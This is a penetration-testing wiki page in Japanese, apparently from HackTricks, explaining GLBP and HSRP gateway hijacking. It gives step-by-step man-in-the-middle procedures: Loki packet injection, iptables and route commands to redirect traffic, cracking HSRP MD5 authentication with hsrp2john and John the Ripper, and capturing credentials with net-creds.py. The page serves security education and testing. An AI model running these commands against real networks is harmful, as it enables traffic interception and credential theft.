# GLBP & HSRP Attacks

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見る
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
- **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>


## FHRPハイジャッキング概要

### FHRPの理解
First Hop Redundancy Protocol（FHRP）は、複数の物理ルーターを1つの仮想エンティティに組み合わせることでネットワークの弾力性を確保するプロトコルスイートです。これにより負荷分散と障害耐性が向上します。Cisco Systemsは、GLBPとHSRPという2つの注目すべきFHRPプロトコルを導入しました。

### GLBPプロトコルの詳細
Ciscoが開発したGLBP（Gateway Load Balancing Protocol）は、TCP/IPスタックの上で動作し、通信にはポート3222でUDPを使用します。GLBPグループ内のルーターは、3秒ごとに「hello」パケットを送信します。ルーターからのこれらのパケットが10秒間欠落すると、そのルーターの障害が発生したと見なされます。ただし、これらのタイマー設定は調整可能です。

### GLBPの動作と負荷分散
GLBPは、1つの仮想IPとさまざまな仮想MACアドレスを使用して、複数のルーター間で負荷を共有できます。グループ内のすべてのルーターがパケットの転送に参加します。GLBPは、次のような真の負荷分散を提供することで、HSRP/VRRPとは異なります：

- **ホスト依存:** ホストが同じAVF MACアドレスを受信し、NAT構成が保持されることを保証します。
- **ラウンドロビン:** AVF MACアドレスが交互に配布されるデフォルトモードです。
- **重みベースのラウンドロビン:** 事前に定義された「重み」メトリックに基づいて負荷をバランスします。

### GLBPドメインの役割と用語
- **AVG（Active Virtual Gateway）:** 他のルーターにMACアドレスを配布する主要なルーターです。
- **AVF（Active Virtual Forwarder）:** ネットワークトラフィックを処理するルーターです。
- **GLBP優先度:** AVGを決定し、デフォルトは100で、1から255までの範囲があります。
- **GLBP重み:** ルーターの負荷レベルを示し、手動で調整するか、オブジェクトトラッキングを介して調整できます。
- **GLBP仮想IPアドレス:** 接続されたデバイスのデフォルトゲートウェイとして機能します。

GLBPは、予約されたマルチキャストアドレス224.0.0.102とUDPポート3222を使用して通信します。3秒ごとに「hello」パケットが送信され、パケットが10秒以内に受信されない場合、ルーターは「dead」とマークされます。

### GLBP攻撃メカニズム
攻撃者は、最も高い優先度値（255）を持つGLBPパケットを送信することで、主要なルーターになることができます。これにより、DoSやMITM攻撃が可能となり、トラフィックの傍受やリダイレクトが可能となります。

### Lokiを使用したGLBP攻撃の実行
[Loki](https://github.com/raizo62/loki_on_kali)は、優先度と重みが255に設定されたパケットを注入することでGLBP攻撃を実行できます。攻撃前の手順には、Wiresharkなどのツールを使用して、仮想IPアドレス、認証の有無、およびルーターの優先度値などの情報を収集することが含まれます。

攻撃手順：
1. プロミスキャスモードに切り替えてIPフォワーディングを有効にします。
2. ターゲットルーターを特定し、そのIPを取得します。
3. Gratuitous ARPを生成します。
4. AVGをなりすまして悪意のあるGLBPパケットを注入します。
5. 攻撃者のネットワークインターフェースにセカンダリIPアドレスを割り当て、GLBP仮想IPを反映させます。
6. 完全なトラフィックの可視性のためにSNATを実装します。
7. インターネットアクセスを元のAVGルーターを介して継続するようにルーティングを調整します。

これらの手順に従うことで、攻撃者は自分自身を「中間者」として配置し、暗号化されていないまたは機密性の高いデータを含むネットワークトラフィックを傍受および分析できます。

デモンストレーションのために、必要なコマンドスニペットを以下に示します：
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### HSRPハイジャックのパッシブな説明とコマンドの詳細

#### HSRP（Hot Standby Router/Redundancy Protocol）の概要
HSRPは、ネットワークゲートウェイの冗長性のために設計されたCisco独自のプロトコルです。複数の物理ルータを1つの論理ユニットに構成し、共有IPアドレスを持つことができます。この論理ユニットは、トラフィックを管理するための責任を持つプライマリルータによって管理されます。GLBPが優先度や重みなどのメトリクスを使用して負荷分散を行うのに対し、HSRPはトラフィック管理のために単一のアクティブルータを使用します。

#### HSRPの役割と用語
- **HSRPアクティブルータ**: トラフィックフローを管理するゲートウェイとして機能するデバイス。
- **HSRPスタンバイルータ**: アクティブルータが故障した場合に引き継ぐ準備ができたバックアップルータ。
- **HSRPグループ**: 単一の強固な仮想ルータを形成するために協力するルータのセット。
- **HSRP MACアドレス**: HSRPセットアップ内の論理ルータに割り当てられた仮想MACアドレス。
- **HSRP仮想IPアドレス**: 接続されたデバイスのデフォルトゲートウェイとして機能するHSRPグループの仮想IPアドレス。

#### HSRPのバージョン
HSRPには、HSRPv1とHSRPv2の2つのバージョンがあり、主にグループ容量、マルチキャストIPの使用、および仮想MACアドレス構造が異なります。プロトコルは、サービス情報の交換に特定のマルチキャストIPアドレスを使用し、Helloパケットは3秒ごとに送信されます。パケットが10秒間受信されない場合、ルータは非アクティブと見なされます。

#### HSRP攻撃メカニズム
HSRP攻撃は、最大優先度値を注入してアクティブルータの役割を強制的に引き継ぐことを含みます。これにより、中間者攻撃（MITM）が発生する可能性があります。攻撃前の重要なステップには、HSRPセットアップに関するデータを収集することが含まれ、Wiresharkを使用してトラフィックを分析することができます。

#### HSRP認証のバイパス手順
1. HSRPデータを含むネットワークトラフィックを.pcapファイルとして保存します。
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.pyを使用して.pcapファイルからMD5ハッシュを抽出します。
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripperを使用してMD5ハッシュをクラックします。
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Lokiを使用したHSRPインジェクションの実行**

1. Lokiを起動してHSRP広告を特定します。
2. ネットワークインターフェースをプロミスキャスモードに設定し、IPフォワーディングを有効にします。
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Lokiを使用して特定のルータをターゲットにし、クラックされたHSRPパスワードを入力し、アクティブルータを偽装するために必要な設定を行います。
4. アクティブルータの役割を取得した後、ネットワークインターフェースとIPテーブルを設定して正当なトラフィックを傍受します。
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 以前のアクティブルータを介してトラフィックをルーティングするためにルーティングテーブルを変更します。
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. 傍受したトラフィックから資格情報をキャプチャするためにnet-creds.pyや類似のユーティリティを使用します。
```shell
sudo python2 net-creds.py -i eth0
```

これらの手順を実行することで、攻撃者はGLBPハイジャックの手順と同様にトラフィックを傍受および操作する立場に置かれます。これは、HSRPなどの冗長性プロトコルの脆弱性と堅牢なセキュリティ対策の必要性を示しています。
